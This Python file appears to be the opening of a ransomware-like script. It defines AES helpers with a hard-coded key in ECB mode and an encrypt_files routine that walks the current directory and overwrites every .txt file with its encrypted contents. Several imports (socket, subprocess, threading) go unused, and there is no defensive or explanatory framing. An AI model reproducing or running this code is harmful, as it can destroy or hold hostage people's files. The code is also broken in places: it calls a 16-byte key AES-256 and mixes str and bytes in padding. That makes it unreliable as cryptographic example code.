import os
import sys
import time
import socket
import random
import string
import hashlib
import threading
import subprocess
from Crypto.Cipher import AES
from Crypto import Random

# AES-256
BLOCK_SIZE = 16
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: c.encrypt(pad(s))
DecodeAES = lambda c, e: c.decrypt(e).rstrip(PADDING)

# AES-256
def encrypt(data):
    private_key = b'This is a key123'  # Define your private key here
    cipher = AES.new(private_key, AES.MODE_ECB)
    encoded = EncodeAES(cipher, data)
    return encoded

def decrypt(data):
    private_key = b'This is a key123'  # Define your private key here
    cipher = AES.new(private_key, AES.MODE_ECB)
    decoded = DecodeAES(cipher, data)
    return decoded

def encrypt_file(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    encrypted = encrypt(data)
    with open(filename, 'wb') as f:
        f.write(encrypted)
        
def decrypt_file(filename):
    with open(filename, 'rb') as f:
        data = f.read()
        removed = decrypt(data)
        
    with open(filename, 'wb') as f:
        f.write(removed)
        
def encrypt_files():
    for root, dirs, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith('.txt'):
                encrypt_file(os.path.join(root, file))
                
